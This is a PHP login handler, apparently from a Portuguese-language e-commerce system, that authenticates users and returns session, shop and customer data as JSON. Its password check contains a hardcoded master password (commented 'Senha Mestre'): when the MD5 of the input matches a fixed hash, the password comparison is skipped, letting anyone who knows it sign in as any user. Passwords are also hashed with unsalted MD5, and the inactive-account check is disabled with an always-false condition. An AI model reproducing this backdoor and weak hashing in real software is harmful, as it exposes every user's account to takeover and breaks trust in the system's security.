<?php
	if (isset($dados)){

		$login 		= $dados["login"];
		$senha 		= $dados["senha"];

		if (($login!="") and ($senha!="")){
			$sqlCriterio1 = tdClass::Criar("sqlcriterio");
			$sqlCriterio2 = tdClass::Criar("sqlcriterio");

			$sqlCriterio1->add(tdClass::Criar("sqlfiltro",array("login",'=',$login)));
			if (md5($senha) != "bf4d9a9fd8ca63472939edad14a91a8d"){ # Senha Mestre
				$sqlCriterio1->add(tdClass::Criar("sqlfiltro",array("senha",'=',md5($senha))));
			}
			$sqlCriterio1->add(tdClass::Criar("sqlfiltro",array("grupousuario",'<>',1)));
			$sqlCriterio2->add(tdClass::Criar("sqlfiltro",array("perfilusuario",'<>',1)));
			$sqlCriterio2->add(tdClass::Criar("sqlfiltro",array("perfilusuario",'is',null)),OU);

			$sql = tdClass::Criar("sqlcriterio");
			$sql->add($sqlCriterio1);
			$sql->add($sqlCriterio2);
			$dataset = tdClass::Criar("repositorio",array(USUARIO))->carregar($sql);

			if ($dataset){
				//if ($dataset[0]->inativo == 1){
				if (2 == 1){
					$retorno = array(
						"status" => 4,
						"error_msg" => "Você ainda não confirmou seu cadastro."
					);
				}else{
					
					$_userid = $dataset[0]->id;
					$session = new stdClass;
					$session->autenticado 		= true;
					$session->userid 			= $_userid;
					$session->username	 		= $dataset[0]->nome;
					$session->empresa			= 1;

					$session->permitirexclusao			= ($dataset[0]->permitirexclusao==""?0:$dataset[0]->permitirexclusao);
					$session->permitirtrocarempresa		= ($dataset[0]->permitirtrocarempresa==""?0:$dataset[0]->permitirtrocarempresa);
					$session->usergroup 				=  $dataset[0]->grupousuario;
					Session::set($session);

					// Filtro para Loja
					$loja				= array( 
						'id' 			=> 0 , 
						'inativo' 		=> true,
						'nomefantasia' 	=> ''
					);

					$categorias			= array();
					$is_loja			= false;
					$loja_entidade_id	= getEntidadeId("ecommerce_loja");
					$ft_loja 			= tdc::f();
					$ft_loja	-> addFiltro("entidadepai","=",$loja_entidade_id);
					$ft_loja	-> addFiltro("entidadefilho","=",getEntidadeId("usuario"));
					$ft_loja	-> addFiltro("regfilho","=",$_userid);

					if (tdc::c(LISTA,$ft_loja) > 0){
						$loja_id			= tdc::d(LISTA,$ft_loja)[0]->regpai;
						$categorias_lista	= getListaRegFilhoObject(
							$loja_entidade_id,
							getEntidadeId("ecommerce_categoria"),
							$loja_id
						);
						$categorias = array();
						foreach($categorias_lista as $c){
							array_push($categorias, $c->id);
						}

						$ds_loja 			= tdc::da('td_ecommerce_loja',tdc::f('id','=',$loja_id));
						if (isset($ds_loja[0])){
							$loja				= $ds_loja[0];
							$is_loja			= true;
						}
					}

					// Filtro para Cliente
					$ft_cliente = tdc::f();
					$ft_cliente	-> addFiltro("entidadepai","=",getEntidadeId("ecommerce_cliente"));
					$ft_cliente	-> addFiltro("entidadefilho","=",getEntidadeId("usuario"));
					$ft_cliente	-> addFiltro("regfilho","=",$session->userid);
					$ds_cliente	= tdc::d(LISTA,$ft_cliente);

					if (!isset($ds_cliente[0])){
						$retorno = array (
							"status" => 4,
							"error_msg" => "Cliente não encontrado"
						);
					}else{
						$cliente 	= tdc::da('td_ecommerce_cliente',tdc::f('id','=',$ds_cliente[0]->regpai))[0];
						$retorno = array(
							"status" 		=> 1,
							"id" 			=> $session->userid,
							"usergroup" 	=> $session->usergroup,
							"username"		=> $session->username,
							"cliente"		=> $cliente,
							"loja" 			=> $loja,
							"categorias"	=> $categorias,
							"is_loja"		=> $is_loja
						);
					}
				}
			}else{
				$retorno = array(
					"status" => 2,
					"error_msg" => "Usu&aacute;rio ou Senha n&atilde;o conferem."
				);
			}
		}else{
			$retorno = array(
				"status" => 3,
				"error_msg" => "Campos Login e/ou Senha n&atilde;o podem estar em branco"
			);
		}
		echo json_encode($retorno);
		exit;
	}